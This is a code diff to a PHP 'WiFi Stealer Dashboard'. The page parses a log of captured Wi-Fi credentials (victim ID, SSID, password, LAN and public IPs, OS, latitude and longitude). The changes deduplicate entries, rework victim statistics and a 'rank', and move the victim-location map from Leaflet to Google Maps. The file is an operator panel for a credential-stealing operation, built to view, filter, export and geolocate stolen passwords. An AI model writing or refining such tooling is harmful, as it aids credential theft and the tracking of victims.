@@ -14,7 +14,7 @@ $logFile = __DIR__ . '/wifi_creds.log';
  *  4: Victim LAN IP
  *  5: Victim OS
  *  6: Public IP
- *  7: LAN IP extra detail (altitude)
+ *  7: Victim LAN extra
  *  8: Latitude
  *  9: Longitude
  * 10: Packet summary
@@ -59,7 +59,6 @@ function parse_capture_line($line)
     if ($timestampRaw !== 'unknown') {
         $ts = strtotime($timestampRaw);
         if ($ts !== false) {
-            // Example: "12 May 2026, 01:50 PM"
             $timestampPretty = date('d M Y, h:i A', $ts);
         }
     }
@@ -238,28 +237,49 @@ if (file_exists($logFile)) {
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
-$captureEntries = [];
+// First parse everything
+$parsedEntries = [];
 foreach ($rawLines as $idx => $rawLine) {
     $entry = parse_capture_line($rawLine);
     if ($entry === null) {
         continue;
     }
-    $entry['log_index'] = $idx; // keep original file index
-    $captureEntries[] = $entry;
+    $entry['log_index'] = $idx;
+    $parsedEntries[] = $entry;
 }
 
-// Sort latest first by raw timestamp if possible
-usort($captureEntries, function ($a, $b) {
+// Sort by time (newest first)
+usort($parsedEntries, function ($a, $b) {
     $ta = strtotime($a['time_raw']);
     $tb = strtotime($b['time_raw']);
     if ($ta === false && $tb === false) return 0;
     if ($ta === false) return 1;
     if ($tb === false) return -1;
-    // newest first
     return $tb <=> $ta;
 });
 
-// Re-index display idx after sorting
+// Now build a de-duplicated list for everything (table, stats, rank)
+$captureEntries = [];
+$seenKeys = [];
+
+foreach ($parsedEntries as $entry) {
+    // duplicate key definition – change as you like
+    $key = $entry['victim_id']
+        . '|' . $entry['ssid']
+        . '|' . $entry['password']
+        . '|' . $entry['latitude']
+        . '|' . $entry['longitude']
+        . '|' . $entry['public_ip'];
+
+    if (isset($seenKeys[$key])) {
+        // skip duplicates completely
+        continue;
+    }
+    $seenKeys[$key] = true;
+    $captureEntries[] = $entry;
+}
+
+// Re-index display idx after de-dup
 foreach ($captureEntries as $i => &$entry) {
     $entry['idx'] = $i;
 }
@@ -267,15 +287,13 @@ unset($entry);
 
 // --- 7. Stats + unique set for rank ---
 
-$totalCaptures       = count($captureEntries); // all rows
+$totalCaptures       = count($captureEntries);
 $ssidCount           = [];
 $ipCount             = [];
 $totalPasswordLength = 0;
 $weakPasswords       = 0;
 
-// For rank: only count unique by victim+ssid+lat+lon
-$uniqueKeySetForRank = [];
-
+// For rank: we can reuse the same de-dup logic (captureEntries are already unique)
 foreach ($captureEntries as $entry) {
     if ($entry['ssid'] !== '') {
         $ssidCount[$entry['ssid']] = ($ssidCount[$entry['ssid']] ?? 0) + 1;
@@ -288,9 +306,6 @@ foreach ($captureEntries as $entry) {
     if ($entry['weak']) {
         $weakPasswords++;
     }
-
-    $rankKey = $entry['victim_id'] . '|' . $entry['ssid'] . '|' . $entry['latitude'] . '|' . $entry['longitude'];
-    $uniqueKeySetForRank[$rankKey] = true;
 }
 
 $uniqueSSIDs     = count($ssidCount);
@@ -298,7 +313,7 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-$uniqueRankCount = count($uniqueKeySetForRank);
+$uniqueRankCount = $totalCaptures; // after de-dup, this is already unique count
 
 // --- 8. Filters from query ---
 $filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
@@ -325,10 +340,10 @@ foreach ($captureEntries as $entry) {
     $filteredEntries[] = $entry;
 }
 
-// --- 9. Map markers + hotspot ---
+// --- 9. Map markers + hotspot (for filtered) ---
 
 $markers = [];
-$locationBuckets = []; // "lat,lon" => count (for filtered list)
+$locationBuckets = []; // "lat,lon" => count
 
 foreach ($filteredEntries as $entry) {
     $lat = $entry['latitude'];
@@ -340,7 +355,7 @@ foreach ($filteredEntries as $entry) {
 
         $markers[] = [
             'lat'       => (float)$lat,
-            'lon'       => (float)$lon,
+            'lng'       => (float)$lon,
             'ssid'      => $entry['ssid'],
             'victim_id' => $entry['victim_id'],
             'time'      => $entry['time'],
@@ -350,7 +365,6 @@ foreach ($filteredEntries as $entry) {
 
 // Hotspot
 $hotspotLabel = 'None';
-$hotspotCount = 0;
 if (!empty($locationBuckets)) {
     arsort($locationBuckets);
     $topKey   = array_key_first($locationBuckets);
@@ -391,7 +405,7 @@ $jsMarkers       = $markers;
 $jsRankName      = $rankName;
 $jsRankPct       = $rankPct;
 $jsHotspotLabel  = $hotspotLabel;
-$jsTotalCaptures = $uniqueRankCount; // show unique count in rank text
+$jsTotalCaptures = $uniqueRankCount;
 
 $viewMode = 'basic';
 ?>
@@ -401,19 +415,14 @@ $viewMode = 'basic';
     <meta charset="UTF-8">
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- Leaflet CSS -->
-    <link
-      rel="stylesheet"
-      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-      integrity="sha256-p4NxAoJBhI+u1Lk9wP1U1zP4PaIBbQxX3A6Z5x3oE04="
-      crossorigin=""
-    />
-    <!-- Leaflet JS -->
+
+    <!-- Google Maps JS API: replace YOUR_API_KEY with your key -->
     <script
-      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
-      integrity="sha256-o9N1j7kCzorZ8M8J3t8C0FqkQ9O9Y6N0wLZ9Z8a5QDY="
-      crossorigin=""
+      src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initCapturesMap"
+      async
+      defer
     ></script>
+
     <style>
         body {
             margin: 0;
@@ -581,6 +590,12 @@ $viewMode = 'basic';
         .status-error {
             color: #fecaca;
         }
+        #captures-map {
+            width: 100%;
+            height: 360px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
         @media (max-width: 768px) {
             table, thead, tbody, th, td, tr {
                 display: block;
@@ -610,6 +625,7 @@ $viewMode = 'basic';
         window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;
 
         var mapInstance = null;
+        var mapInitializedOnce = false;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -678,69 +694,73 @@ $viewMode = 'basic';
         function showCapturesMap() {
             var box = document.getElementById('captures-box');
             if (!box) return;
-
-            // make visible before creating map
             box.style.display = 'block';
 
-            var mapDiv = document.getElementById('captures-map');
-            if (!mapDiv) return;
-
-            // destroy old map if exists
+            // If Google Maps JS has already initialized the map once, just trigger resize
             if (mapInstance) {
-                mapInstance.remove();
-                mapInstance = null;
+                google.maps.event.trigger(mapInstance, 'resize');
             }
-
-            var markers = window.captureMarkers || [];
-            var defaultLat = 20.5937;
-            var defaultLon = 78.9629;
-            var defaultZoom = 4;
-
-            if (markers.length > 0) {
-                defaultLat = markers[0].lat;
-                defaultLon = markers[0].lon;
-                defaultZoom = 5;
-            }
-
-            mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);
-
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                maxZoom: 18,
-                attribution: '&copy; OpenStreetMap contributors'
-            }).addTo(mapInstance);
-
-            var bounds = [];
-            markers.forEach(function(m) {
-                if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
-                var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
-                marker.bindPopup(
-                    '<b>Victim:</b> ' + m.victim_id + '<br/>' +
-                    '<b>SSID:</b> ' + m.ssid + '<br/>' +
-                    '<b>Time:</b> ' + m.time
-                );
-                bounds.push([m.lat, m.lon]);
-            });
-
-            if (bounds.length > 1) {
-                mapInstance.fitBounds(bounds, { padding: [20, 20] });
-            } else if (bounds.length === 1) {
-                mapInstance.setView(bounds[0], 12);
-            }
-
-            setTimeout(function() {
-                mapInstance.invalidateSize();
-            }, 100);
         }
 
         function hideCapturesMap() {
             var box = document.getElementById('captures-box');
             if (box) box.style.display = 'none';
+        }
 
-            if (mapInstance) {
-                mapInstance.remove();
-                mapInstance = null;
+        // This is called by Google Maps JS callback=initCapturesMap
+        function initCapturesMap() {
+            var mapDiv = document.getElementById('captures-map');
+            if (!mapDiv) {
+                return;
+            }
+
+            var markersData = window.captureMarkers || [];
+            var defaultLat = 20.5937;
+            var defaultLng = 78.9629;
+            var defaultZoom = 4;
+
+            if (markersData.length > 0) {
+                defaultLat = markersData[0].lat;
+                defaultLng = markersData[0].lng;
+                defaultZoom = 5;
+            }
+
+            mapInstance = new google.maps.Map(mapDiv, {
+                center: { lat: defaultLat, lng: defaultLng },
+                zoom: defaultZoom,
+                mapTypeId: 'roadmap'
+            });
+
+            var bounds = new google.maps.LatLngBounds();
+
+            markersData.forEach(function(m) {
+                if (!m.lat || !m.lng || isNaN(m.lat) || isNaN(m.lng)) return;
+                var pos = { lat: m.lat, lng: m.lng };
+                var marker = new google.maps.Marker({
+                    position: pos,
+                    map: mapInstance,
+                    title: m.ssid + ' / ' + m.victim_id
+                });
+
+                var info = new google.maps.InfoWindow({
+                    content: '<b>Victim:</b> ' + m.victim_id +
+                             '<br><b>SSID:</b> ' + m.ssid +
+                             '<br><b>Time:</b> ' + m.time
+                });
+
+                marker.addListener('click', function() {
+                    info.open(mapInstance, marker);
+                });
+
+                bounds.extend(pos);
+            });
+
+            if (!bounds.isEmpty()) {
+                mapInstance.fitBounds(bounds);
             }
         }
+
+        window.initCapturesMap = initCapturesMap;
     </script>
 </head>
 <body>
@@ -758,7 +778,6 @@ $viewMode = 'basic';
         <div class="actions">
             <a href="?action=export_csv" class="btn">Export CSV</a>
 
-            <!-- Upload CSV button -->
             <form class="upload-form" method="post" enctype="multipart/form-data">
                 <input type="hidden" name="action" value="import_csv">
                 <input type="file" name="csv_file" accept=".csv" required>
@@ -791,7 +810,6 @@ $viewMode = 'basic';
         </div>
     <?php endif; ?>
 
-    <!-- FILTERS -->
     <div class="card">
         <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
             <input type="text" name="vid" placeholder="Filter Victim ID"
@@ -918,7 +936,7 @@ $viewMode = 'basic';
             </div>
             <button type="button" class="btn btn-sm btn-danger" onclick="hideCapturesMap();">Close</button>
         </div>
-        <div id="captures-map" style="width:100%; height:360px; border-radius:10px; overflow:hidden;"></div>
+        <div id="captures-map"></div>
         <div style="font-size:11px; color:#9ca3af; margin-top:4px;">
             Markers show each capture location (based on recorded latitude/longitude).
         </div>
